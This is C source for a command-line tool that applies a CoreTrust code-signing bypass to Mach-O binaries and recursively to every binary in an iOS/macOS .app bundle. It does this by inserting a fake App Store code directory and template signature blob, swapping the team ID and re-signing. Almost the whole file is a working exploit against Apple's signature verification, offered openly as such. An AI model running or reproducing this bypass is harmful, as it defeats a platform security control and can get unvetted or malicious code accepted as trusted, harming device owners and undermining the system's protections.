
#include <stddef.h>
#include <stdint.h>
#include <stdio.h>
#include <dirent.h>
#include <sys/stat.h>
#include <choma/CSBlob.h>
#include <choma/MachOByteOrder.h>
#include <choma/MachO.h>
#include <choma/Host.h>
#include <choma/MemoryStream.h>
#include <choma/FileStream.h>
#include <choma/BufferedStream.h>
#include <choma/Signing.h>
#include <choma/SignatureBlob.h>
#include <choma/SignOSSL.h>
#include <choma/CodeDirectory.h>
#include "AppStoreCodeDirectory.h"
#include "TemplateSignatureBlob.h"
#include <copyfile.h>

char *extract_preferred_slice(const char *fatPath)
{
    FAT *fat = fat_init_from_path(fatPath);
    if (!fat) return NULL;
    MachO *macho = fat_find_preferred_slice(fat);
    if (!macho) return NULL;
    
    char *temp = strdup("/tmp/XXXXXX");
    int fd = mkstemp(temp);

    MemoryStream *outStream = file_stream_init_from_path(temp, 0, 0, FILE_STREAM_FLAG_WRITABLE | FILE_STREAM_FLAG_AUTO_EXPAND);
    MemoryStream *machoStream = macho_get_stream(macho);
    memory_stream_copy_data(machoStream, 0, outStream, 0, memory_stream_get_size(machoStream));

    fat_free(fat);
    memory_stream_free(outStream);
    close(fd);
    return temp;
}

int extract_blobs(CS_SuperBlob *superBlob, const char *dir)
{
    CS_DecodedSuperBlob *decodedSuperblob = csd_superblob_decode(superBlob);

    CS_DecodedBlob *blob = decodedSuperblob->firstBlob;
    while (blob) {
        char outPath[PATH_MAX];
        CS_GenericBlob genericBlob;
        csd_blob_read(blob, 0, sizeof(genericBlob), &genericBlob);
        GENERIC_BLOB_APPLY_BYTE_ORDER(&genericBlob, BIG_TO_HOST_APPLIER);

        snprintf(outPath, PATH_MAX, "%s/%x_%x.bin", dir, blob->type, genericBlob.magic);

        uint64_t len = csd_blob_get_size(blob);
        uint8_t blobData[len];
        csd_blob_read(blob, 0, len, blobData);

        FILE *f = fopen(outPath, "wb");
        fwrite(blobData, len, 1, f);
        fclose(f);

        blob = blob->next;
    }
    return 0;
}

char *get_argument_value(int argc, char *argv[], const char *flag)
{
    for (int i = 0; i < argc; i++) {
        if (!strcmp(argv[i], flag)) {
            if (i+1 < argc) {
                return argv[i+1];
            }
        }
    }
    return NULL;
}

bool argument_exists(int argc, char *argv[], const char *flag)
{
    for (int i = 0; i < argc; i++) {
        if (!strcmp(argv[i], flag)) {
            return true;
        }
    }
    return false;
}

void print_usage(const char *self)
{
    printf("Usage: \n");
    printf("\t%s -i <path to input MachO/FAT file> (-r) (-o <path to output MachO file>)\n", self);
    printf("\t%s -i <path to input .app bundle> -a\n", self);
    exit(-1);
}

int apply_coretrust_bypass(const char *machoPath)
{
    MachO *macho = macho_init_for_writing(machoPath);
    if (!macho) return -1;
    
    CS_SuperBlob *superblob = macho_read_code_signature(macho);
    if (!superblob) {
        printf("Error: no code signature found, please fake-sign the binary at minimum before running the bypass.\n");
        return -1;
    }

    CS_DecodedSuperBlob *decodedSuperblob = csd_superblob_decode(superblob);
    uint64_t originalCodeSignatureSize = BIG_TO_HOST(superblob->length);
    free(superblob);

    CS_DecodedBlob *realCodeDirectoryBlob = NULL;
    CS_DecodedBlob *mainCodeDirectoryBlob = csd_superblob_find_blob(decodedSuperblob, CSSLOT_CODEDIRECTORY, NULL);
    CS_DecodedBlob *alternateCodeDirectoryBlob = csd_superblob_find_blob(decodedSuperblob, CSSLOT_ALTERNATE_CODEDIRECTORIES, NULL);

    if (!mainCodeDirectoryBlob) {
        printf("Error: Unable to find code directory, make sure the input binary is ad-hoc signed?\n");
        return -1;
    }

    // We need to determine which code directory to transfer to the new binary
    if (alternateCodeDirectoryBlob) {
        // If an alternate code directory exists, use that and remove the main one from the superblob
        realCodeDirectoryBlob = alternateCodeDirectoryBlob;
        csd_superblob_remove_blob(decodedSuperblob, mainCodeDirectoryBlob);
        csd_blob_free(mainCodeDirectoryBlob);
    }
    else {
        // Otherwise use the main code directory
        realCodeDirectoryBlob = mainCodeDirectoryBlob;
    }
    // TODO: Sanity check that realCodeDirectoryBlob is SHA256, if it's not the bypass won't work...

    printf("Applying App Store code directory...\n");

    // Append real code directory as alternateCodeDirectory at the end of superblob
    csd_superblob_remove_blob(decodedSuperblob, realCodeDirectoryBlob);
    csd_blob_set_type(realCodeDirectoryBlob, CSSLOT_ALTERNATE_CODEDIRECTORIES);
    csd_superblob_append_blob(decodedSuperblob, realCodeDirectoryBlob);

    // Insert AppStore code directory as main code directory at the start
    CS_DecodedBlob *appStoreCodeDirectoryBlob = csd_blob_init(CSSLOT_CODEDIRECTORY, (CS_GenericBlob *)AppStoreCodeDirectory);
    csd_superblob_insert_blob_at_index(decodedSuperblob, appStoreCodeDirectoryBlob, 0);

    printf("Adding new signature blob...\n");
    CS_DecodedBlob *signatureBlob = csd_superblob_find_blob(decodedSuperblob, CSSLOT_SIGNATURESLOT, NULL);
    if (signatureBlob) {
        // Remove existing signatureBlob if existant
        csd_superblob_remove_blob(decodedSuperblob, signatureBlob);
        csd_blob_free(signatureBlob);
    }
    // Append new template blob
    signatureBlob = csd_blob_init(CSSLOT_SIGNATURESLOT, (CS_GenericBlob *)TemplateSignatureBlob);
    csd_superblob_append_blob(decodedSuperblob, signatureBlob);

    // After Modification:
    // 1. App Store CodeDirectory (SHA1)
    // ?. Requirements
    // ?. Entitlements
    // ?. DER entitlements
    // 5. Actual CodeDirectory (SHA256)
    // 6. Signature blob

    printf("Updating TeamID...\n");

    // Get team ID from AppStore code directory
    // For the bypass to work, both code directories need to have the same team ID
    char *appStoreTeamID = NULL;
    if (appStoreCodeDirectoryBlob != NULL) {
        CS_CodeDirectory appStoreCodeDirectory;
        csd_blob_read(appStoreCodeDirectoryBlob, 0, sizeof(appStoreCodeDirectory), &appStoreCodeDirectory);
        CODE_DIRECTORY_APPLY_BYTE_ORDER(&appStoreCodeDirectory, BIG_TO_HOST_APPLIER);
        csd_blob_read_string(appStoreCodeDirectoryBlob, appStoreCodeDirectory.teamOffset, &appStoreTeamID);
    }
    if (!appStoreTeamID) {
        printf("Error: Unable to determine AppStore TeamID\n");
        return -1;
    }

    // Set the team ID of the real code directory to the AppStore one
    size_t appStoreTeamIDSize = strlen(appStoreTeamID)+1;
    if (realCodeDirectoryBlob != NULL) {
        CS_CodeDirectory codeDir;
        csd_blob_read(realCodeDirectoryBlob, 0, sizeof(codeDir), &codeDir);
        CODE_DIRECTORY_APPLY_BYTE_ORDER(&codeDir, BIG_TO_HOST_APPLIER);

        int32_t shift = 0;
        uint32_t initalTeamOffset = codeDir.teamOffset;

        // If there is already a TeamID, delete it
        if (initalTeamOffset != 0) {
            uint32_t existingTeamIDSize = 0;
            char *existingTeamID = NULL;
            csd_blob_read_string(realCodeDirectoryBlob, initalTeamOffset, &existingTeamID);
            existingTeamIDSize = strlen(existingTeamID)+1;
            free(existingTeamID);

            csd_blob_delete(realCodeDirectoryBlob, initalTeamOffset, existingTeamIDSize);
            shift -= existingTeamIDSize;
        }

        // Insert new TeamID
        if (codeDir.identOffset == 0) {
            printf("No identity found, that's bad.\n");
            free(appStoreTeamID);
            return -1;
        }
        char *ident = NULL;
        csd_blob_read_string(realCodeDirectoryBlob, codeDir.identOffset, &ident);
        uint32_t newTeamOffset = codeDir.identOffset + strlen(ident) + 1;
        free(ident);
        csd_blob_insert(realCodeDirectoryBlob, newTeamOffset, appStoreTeamIDSize, appStoreTeamID);
        shift += appStoreTeamIDSize;
        
        codeDir.teamOffset = newTeamOffset;

        // Offsets that point to after the TeamID have to be shifted
        if (codeDir.hashOffset != 0 && codeDir.hashOffset > initalTeamOffset) {
            codeDir.hashOffset += shift;
        }
        if (codeDir.scatterOffset != 0 && codeDir.scatterOffset > initalTeamOffset) {
            codeDir.scatterOffset += shift;
        }

        CODE_DIRECTORY_APPLY_BYTE_ORDER(&codeDir, HOST_TO_BIG_APPLIER);
        csd_blob_write(realCodeDirectoryBlob, 0, sizeof(codeDir), &codeDir);
    }
    else {
        printf("Failed to locate actual CD blob.\n");
        free(appStoreTeamID);
        return -1;
    }
    printf("TeamID set to %s!\n", appStoreTeamID);
    free(appStoreTeamID);

    printf("Encoding unsigned superblob...\n");
    CS_SuperBlob *encodedSuperblobUnsigned = csd_superblob_encode(decodedSuperblob);

    printf("Updating load commands...\n");
    if (update_load_commands_for_coretrust_bypass(macho, encodedSuperblobUnsigned, originalCodeSignatureSize, memory_stream_get_size(macho->stream)) != 0) {
        printf("Error: failed to update load commands!\n");
        return -1;
    }
    free(encodedSuperblobUnsigned);

    printf("Updating code slot hashes...\n");
    csd_code_directory_update(realCodeDirectoryBlob, macho);

    int ret = 0;
    printf("Signing binary...\n");
    ret = update_signature_blob(decodedSuperblob);
    if(ret == -1) {
        printf("Error: failed to create new signature blob!\n");
        return -1;
    }

    printf("Encoding signed superblob...\n");
    CS_SuperBlob *newSuperblob = csd_superblob_encode(decodedSuperblob);

    printf("Writing superblob to MachO...\n");
    // Write the new signed superblob to the MachO
    macho_replace_code_signature(macho, newSuperblob);

    csd_superblob_free(decodedSuperblob);
    free(newSuperblob);
    
    macho_free(macho);
    return 0;
}

int apply_coretrust_bypass_wrapper(const char *inputPath, const char *outputPath)
{
    char *machoPath = extract_preferred_slice(inputPath);
    printf("extracted best slice to %s\n", machoPath);

    int r = apply_coretrust_bypass(machoPath);
    if (r != 0) {
        free(machoPath);
        return r;
    }

    r = copyfile(machoPath, outputPath, 0, COPYFILE_ALL | COPYFILE_MOVE | COPYFILE_UNLINK);
    if (r == 0) {
        chmod(outputPath, 0755);
        printf("Signed file! CoreTrust bypass eta now!!\n");
    }
    else {
        perror("copyfile");
    }

    free(machoPath);
    return r;
}

int apply_coretrust_bypass_to_app_bundle(const char *appBundlePath) {
    // Recursively find all MachO files in the app bundle
    DIR *dir;
    struct dirent *entry;
    struct stat statbuf;

    if ((dir = opendir(appBundlePath)) == NULL) {
        perror("opendir");
        return -1;
    }

    while ((entry = readdir(dir)) != NULL) {
        char fullpath[1024];
        snprintf(fullpath, sizeof(fullpath), "%s/%s", appBundlePath, entry->d_name);

        if (stat(fullpath, &statbuf) == -1) {
            perror("stat");
            return -1;
        }

        if (S_ISDIR(statbuf.st_mode)) {
            if (strcmp(entry->d_name, ".") != 0 && strcmp(entry->d_name, "..") != 0) {
                // Recursive call for subdirectories
                apply_coretrust_bypass_to_app_bundle(fullpath);
            }
        } else {
            // Process file
            MemoryStream *stream = file_stream_init_from_path(fullpath, 0, 0, 0);
            if (!stream) {
                printf("Error: failed to open file %s\n", fullpath);
                continue;
            }
            uint32_t magic = 0;
            memory_stream_read(stream, 0, sizeof(magic), &magic);
            if (magic == FAT_MAGIC_64 || magic == MH_MAGIC_64) {
                printf("Applying bypass to %s.\n", fullpath);
                apply_coretrust_bypass_wrapper(fullpath, fullpath);
            }
            memory_stream_free(stream);
        }
    }

    closedir(dir);
    return 0;
}

int main(int argc, char *argv[]) {

    if (argc < 2) {
        print_usage(argv[0]);
    }

    char *input = get_argument_value(argc, argv, "-i");
    char *output = get_argument_value(argc, argv, "-o");
    bool replace = argument_exists(argc, argv, "-r");
    bool appBundle = argument_exists(argc, argv, "-a");
    if (appBundle) {
        if (replace || output) {
            print_usage(argv[0]);
        }

        struct stat s;
        bool inputExists = stat(input, &s) == 0;

        if (!inputExists) {
            print_usage(argv[0]);
        }

        char *dot = strrchr(input, '.');
        if (!dot || strcmp(dot, ".app")) {
            printf("Error: %s is not an app bundle.\n", input);
            return -1;
        }

        printf("Applying CoreTrust bypass to app bundle.\n");
        printf("CoreTrust bypass eta s0n!!\n");
        return apply_coretrust_bypass_to_app_bundle(input);
    }
    
    if (!output && !replace) {
        print_usage(argv[0]);
    }
    if (!output && replace) {
        output = input;
    }

    struct stat s;
    bool inputExists = stat(input, &s) == 0;
    bool outputExists = stat(output, &s) == 0;

    if (!inputExists) {
        print_usage(argv[0]);
    }

    if (outputExists && !replace) {
        printf("Error: Output file already exists, for overwriting use the -r argument\n");
        return -1;
    }

    printf("CoreTrust bypass eta s0n!!\n");
    return apply_coretrust_bypass_wrapper(input, output);
}
